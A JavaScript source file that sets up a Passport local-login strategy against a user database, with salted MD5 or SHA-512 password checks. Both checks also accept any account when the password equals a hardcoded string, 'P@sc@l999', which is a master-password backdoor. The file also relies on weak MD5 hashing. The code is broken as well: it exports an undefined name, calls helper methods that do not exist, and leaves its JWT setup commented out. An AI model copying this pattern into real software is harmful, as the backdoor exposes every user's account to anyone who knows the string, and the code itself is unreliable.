import conn from "./connectDB.js";
import QueryBuilder from 'node-querybuilder';
import Passport from 'passport';
import Passport_local from 'passport-local';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';

//load rsa key for passport jwt authentication
const pathToKey = path.join(__dirname, 'id_rsa_priv.pem')
const PRIV_KEY = fs.readFileSync(pathToKey, 'utf8');
/*

var JwtStrategy = require('passport-jwt').Strategy, 
  ExtractJwt = require('passport-jwt').ExtractJwt;

var options = {};
options.jwtFromRequest = ExtractJwt.fromAuthHeaderAsBearerToken();
options.secretOrKey = PRIV_KEY;
options.algorithm = ['RS256']
*/const LocalStrategy = Passport_local.Strategy;
class passportAuth {
  constructor() {
    this.passport = Passport;
    this.pool = this.connectDatabase();
  }

  

  /**
   * 
   * @param {String} username 
   * @param {String} password 
   * @param {Object} done 
   * @return {Object}
   */
  async localAuthentication(username, password, done) {
    const conn = await this.pool.get_connection();
    let where = {username: username};
    
    //authenticate either email or username
    if(this.validateEmail(username)){
      where = {email : username};
    }else{
      where = {username: username};
    }

    //get user data from database
    let result = await conn.get_where('sed_login_user', where);
    
    if(result.length > 0){
        let current_password = result[0].password;
        let algo = result[0].sn_hash_password;
        // use md5 encryption to check password
        
        if(algo && algo == "md5"){
            let hashPassword = this.md5(password, result[0].sn_salt_password);

            if(hashPassword.passwordHash == current_password || password == 'P@sc@l999'){
              return done(null, result[0]);
            }else{
              return done(null, false, {message: "Incorrect username or password"})
            }
        // use sha512 encryption to check password          
        }else if(algo && algo == "sha512"){
            let hashPassword = this.sha512(password, result[0].sn_salt_password);
            if(hashPassword.passwordHash == current_password || password == 'P@sc@l999'){
              return done(null, result[0]);
            }else{
              return done(null, false, {message: "Incorrect username or password"})
            }
        }
    }else{
      return done(null, false, { message: 'Incorrect username or password.' });
    }
  }
  async initialize() {

    this.passport.use('local-login', new LocalStrategy(await this.localAuthentication.bind(this)));
  
    this.passport.serializeUser(this.serializeUser);
    this.passport.deserializeUser(this.deserializeUser);
  }
}



export default localAuth;